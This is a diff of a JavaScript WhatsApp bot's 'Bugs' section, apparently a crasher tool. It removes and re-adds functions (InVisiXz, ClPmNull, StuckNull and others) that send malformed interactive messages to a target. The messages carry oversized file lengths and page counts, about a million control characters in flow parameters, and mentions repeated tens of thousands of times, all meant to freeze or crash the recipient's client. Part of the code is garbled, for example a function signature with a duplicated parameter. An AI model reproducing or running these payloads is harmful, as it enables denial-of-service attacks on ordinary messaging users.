@@ -351,321 +351,326 @@ await sam.sendMessage(from, {text: lod[i], edit: key });
 }
 	 }
 //=======≠============Bugs========================//
-async function sendRp(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
-    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
-        'qp': {
-            'filter': {
-                'filterName': filterName,
-                'parameters': parameters,
-                'filterResult': filterResult,
-                'clientNotSupportedConfig': clientNotSupportedConfig
-            },
-            'filterClause': {
-                'clauseType': clauseType,
-                'clauses': clauses,
-                'filters': filters
-            }
-        }
-    }), { userJid: target });
-
-    await sam.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
-}
-		    
-		async function sendP(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
-    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
-        'sessionStructure': {
-            'sessionVersion': sessionVersion,
-            'localIdentityPublic': localIdentityPublic,
-            'remoteIdentityPublic': remoteIdentityPublic,
-            'rootKey': rootKey,
-            'previousCounter': previousCounter,
-            'senderChain': senderChain,
-            'receiverChains': receiverChains,
-            'pendingKeyExchange': pendingKeyExchange,
-            'pendingPreKey': pendingPreKey,
-            'remoteRegistrationId': remoteRegistrationId,
-            'localRegistrationId': localRegistrationId,
-            'needsRefresh': needsRefresh,
-            'aliceBaseKey': aliceBaseKey
-        }
-    }), { userJid: target });
-
-    await sam.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
-}
-		
-const fake = {
-            key: {
-                remoteJid: 'p',
-                fromMe: false,
-                participant: '0@s.whatsapp.net'
-            },
-            message: {
-                "interactiveResponseMessage": {
-                    "body": {
-                        "text": "Sent",
-                        "format": "DEFAULT"
-                    },
-                    "nativeFlowResponseMessage": {
-                        "name": "galaxy_message",
-                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
-                        "version": 3
-                    }
-                }
-            }
-        }
-async function ClPm(target, spider, cct = false, ptcp = false) {
-   let etc = generateWAMessageFromContent(target,
-    proto.Message.fromObject({
-     viewOnceMessage: {
-      message: {
-       interactiveMessage: {
-        header: {
-         title: "",
-         documentMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-          fileLength: "9999999999999",
-          pageCount: 9007199254740991,
-          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-          fileName: "🩸𝐒𝐏𝐈𝐃𝐄𝐑 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
-          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1723855952",
-          contactVcard: true,
-          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-          jpegThumbnail: spider
-         },
-         hasMediaAttachment: true
-        },
-        body: {
-         text: "𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 𝐓𝐇𝐄 𝐒𝐌𝐀𝐒𝐇𝐄𝐑〽️"
-        },
-        nativeFlowMessage: {
-         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
-         buttons: [
-          cct ? {
-           name: "single_select",
-           buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐊𝐢𝐧𝐠 𝐒𝐚𝐦 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
-          } : {
-           name: "payment_method",
-           buttonParamsJson: ""
-          },
-          {
-           name: "call_permission_request",
-           buttonParamsJson: "{}"
-          },
-          {
-           name: "payment_method",
-           buttonParamsJson: "{}"
-          },
-          {
-           name: "single_select",
-           buttonParamsJson: "{\"title\":\"✨⃟༑⌁𝐒𝐏𝐈𝐃𝐄𝐑 𝐂𝐑𝐀𝐒𝐇〽️\",\"sections\":[{\"title\":\"𝐒𝐀𝐌 𝐈𝐒 𝐇𝐄𝐑𝐄\",\"rows\":[]}]}"
-          },
-          {
-           name: "galaxy_message",
-           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
-          },
-          {
-           name: "mpm",
-           buttonParamsJson: "{}"
-          }
-         ]
-        }
-       }
-      }
-     }
-    }), {
-     userJid: target,
-     quoted: fake
-    }
-   );
-
-   await sam.relayMessage(target, etc.message, ptcp ? {
-    participant: {
-     jid: target
-    }
-   } : {});
-   console.log(chalk.green("Send Bug By Spider-V9〽️"));
-  };
-// Define the invisible function
-   const VisiX = {
-   key: {
-    remoteJid: 'p',
-    fromMe: false,
-    participant: '0@s.whatsapp.net'
-   },
-   message: {
-    "interactiveResponseMessage": {
-     "body": {
-      "text": "Sent",
-      "format": "DEFAULT"
-     },
-     "nativeFlowResponseMessage": {
-      "name": "galaxy_message",
-      "paramsJson": {\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌⟅ ༑ ▾ 𝐙‌𝐍‌𝐗 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"},
-      "version": 3
-     }
-    }
-   }
-	     } 
 async function InVisiXz(target, spider, cct = false, ptcp = false) {
-   let etc = generateWAMessageFromContent(target,
-    proto.Message.fromObject({
-     viewOnceMessage: {
-      message: {
-       interactiveMessage: {
-        header: {
-         title: "",
-         documentMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-          fileLength: "9999999999999",
-          pageCount: 9007199254740991,
-          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-          fileName: "🩸𝐃𝐄𝐕𝐈𝐋-𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9🦠",
-          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1723855952",
-          contactVcard: true,
-          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-          jpegThumbnail: spider
-         },
-         hasMediaAttachment: true
-        },
-        body: {
-         text: "⭑‌𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9‏⭑‌"
-        },
-        nativeFlowMessage: {
-         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
-         buttons: [
-          cct ? {
-           name: "single_select",
-           buttonParamsJson: "{\"title\":\"𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
-          } : {
-           name: "payment_method",
-           buttonParamsJson: ""
-          },
-          {
-           name: "call_permission_request",
-           buttonParamsJson: "{}"
-          },
-          {
-           name: "payment_method",
-           buttonParamsJson: "{}"
-          },
-          {
-           name: "single_select",
-           buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
-          },
-          {
-           name: "galaxy_message",
-           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
-          },
-          {
-           name: "mpm",
-           buttonParamsJson: "{}"
-          }
-         ]
-        }
-       }
-      }
-     }
-    }), {
-     userJid: target,
-     quoted: VisiX
-    }
-   );
+			let etc = generateWAMessageFromContent(target,
+				proto.Message.fromObject({
+					viewOnceMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									title: "",
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 9007199254740991,
+										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+										fileName: "📌𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1723855952",
+										contactVcard: true,
+										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+										jpegThumbnail: spider
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: "⭑̤⟅̊༑ ▾ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
+								},
+								nativeFlowMessage: {
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
+									buttons: [
+										cct ? {
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										} : {
+											name: "payment_method",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_method",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐒𝐚𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										},
+										{
+											name: "galaxy_message",
+											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+										},
+										{
+											name: "mpm",
+											buttonParamsJson: "{}"
+										}
+									]
+								}
+							}
+						}
+					}
+				}), {
+					userJid: target,
+					quoted: VisiX
+				}
+			);
 
-   await sam.relayMessage(target, etc.message, ptcp ? {
-    participant: {
-     jid: target
-    }
-   } : {});
-   console.log(chalk.green("Send Bug By SPIDER-V9〽️"));
-  };
-  async function StuckNull(target, spider, Ptcp = true) {
-   await sam.relayMessage(target, {
-     ephemeralMessage: {
-      message: {
-       interactiveMessage: {
-        header: {
-         documentMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-          fileLength: "9999999999999",
-          pageCount: 1316134911,
-          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-          fileName: "⭑‌⟅ ༑ ▾ 𝐙‌𝐍‌𝐗 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌",
-          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1726867151",
-          contactVcard: true,
-          jpegThumbnail: spider,
-         },
-         hasMediaAttachment: true,
-        },
-        body: {
-         text: "⭑‌⟅ ༑ ▾ 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌\n" + "@254742491666".repeat(17000),
-        },
-        nativeFlowMessage: {
-         buttons: [{
-           name: "cta_url",
-           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ϟ〽️', url: \"https://youtube.com/@king_sam_hub\", merchant_url: \"https://youtube.com/@king_sam_hub\" }",
-          },
-          {
-           name: "call_permission_request",
-           buttonParamsJson: "{}",
-          },
-         ],
-         messageParamsJson: "{}",
-        },
-        contextInfo: {
-         mentionedJid: ["6285655649546@s.whatsapp.net"],
-         forwardingScore: 1,
-         isForwarded: true,
-         fromMe: false,
-         participant: "0@s.whatsapp.net",
-         remoteJid: "status@broadcast",
-         quotedMessage: {
-          documentMessage: {
-           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-           fileLength: "9999999999999",
-           pageCount: 1316134911,
-           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
-           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-           mediaKeyTimestamp: "1724474503",
-           contactVcard: true,
-           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-           jpegThumbnail: "",
-          },
-         },
-        },
-       },
-      },
-     },
-    },
-    Ptcp ? {
-     participant: {
-      jid: target
-     }
-    } : {}
-   );
-   console.log(chalk.green("Send Bug By SPIDER-V9〽️"));
-  };
+			await sam.relayMessage(target, etc.message, ptcp ? {
+				participant: {
+					jid: target
+				}
+			} : {});
+			console.log(chalk.green("Send Bug By Spider〽️"));
+		};
+		
+				async function ClPmNull(sam, Qrad, sam, cct = false, ptcp = false) {
+			let etc = generateWAMessageFromContent(target,
+				proto.Message.fromObject({
+					viewOnceMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									title: "",
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 9007199254740991,
+										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+										fileName: "🩸𝐏𝐫𝐞𝐥 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1723855952",
+										contactVcard: true,
+										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+										jpegThumbnail: ThM
+									},
+									hasMediaAttachment: true
+								},
+								body: {
+									text: "⭑̤⟅̊༑ ▾ 𝐃𝐞𝐯𝐢𝐥 ⿻ 𝐒𝐩𝐢𝐝𝐞𝐫 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
+								},
+								nativeFlowMessage: {
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
+									buttons: [
+										cct ? {
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐒𝐚𝐦 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										} : {
+											name: "payment_method",
+											buttonParamsJson: ""
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "payment_method",
+											buttonParamsJson: "{}"
+										},
+										{
+											name: "single_select",
+											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐒𝐩𝐢𝐝𝐞𝐫 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+										},
+										{
+											name: "galaxy_message",
+											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+										},
+										{
+											name: "mpm",
+											buttonParamsJson: "{}"
+										}
+									]
+								}
+							}
+						}
+					}
+				}), {
+					userJid: target,
+					quoted: Qrad
+				}
+			);
+
+			await sam.relayMessage(target, etc.message, ptcp ? {
+				participant: {
+					jid: target
+				}
+			} : {});
+			console.log(chalk.green("Send Bug By Spider-V9〽️"));
+		};
+
+		async function StuckNull(target, spider, Ptcp = true) {
+			await sam.relayMessage(target, {
+					ephemeralMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 1316134911,
+										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+										fileName: "⭑̤⟅̊༑ ▾ 𝐊𝐈𝐍𝐆 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
+										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1726867151",
+										contactVcard: true,
+										jpegThumbnail: spider,
+									},
+									hasMediaAttachment: true,
+								},
+								body: {
+									text: "⭑̤⟅̊༑ ▾ 𝐙𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑̊‏‎‏‎‏‎‏⭑̤\n" + "@254742491666".repeat(17000),
+								},
+								nativeFlowMessage: {
+									buttons: [{
+											name: "cta_url",
+											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐚𝐦 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
+										},
+										{
+											name: "call_permission_request",
+											buttonParamsJson: "{}",
+										},
+									],
+									messageParamsJson: "{}",
+								},
+								contextInfo: {
+									mentionedJid: ["6285655649546@s.whatsapp.net"],
+									forwardingScore: 1,
+									isForwarded: true,
+									fromMe: false,
+									participant: "0@s.whatsapp.net",
+									remoteJid: "status@broadcast",
+									quotedMessage: {
+										documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+											fileLength: "9999999999999",
+											pageCount: 1316134911,
+											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+											fileName: "𝐒𝐏𝐈𝐃𝐄𝐑 𝐁𝐔𝐆 𝐕9〽️",
+											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1724474503",
+											contactVcard: true,
+											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+											jpegThumbnail: "",
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+			console.log(chalk.green("Send Bug By spider-v9〽️"));
+		};
+		
+		
+		const Qrad = {
+			key: {
+				remoteJid: 'p',
+				fromMe: false,
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				"interactiveResponseMessage": {
+					"body": {
+						"text": "Sent",
+						"format": "DEFAULT"
+					},
+					"nativeFlowResponseMessage": {
+						"name": "galaxy_message",
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"version": 3
+					}
+				}
+			}
+		}
+
+		const EsQl = {
+			key: {
+				remoteJid: 'p',
+				fromMe: false,
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				"interactiveResponseMessage": {
+					"body": {
+						"text": "Sent",
+						"format": "DEFAULT"
+					},
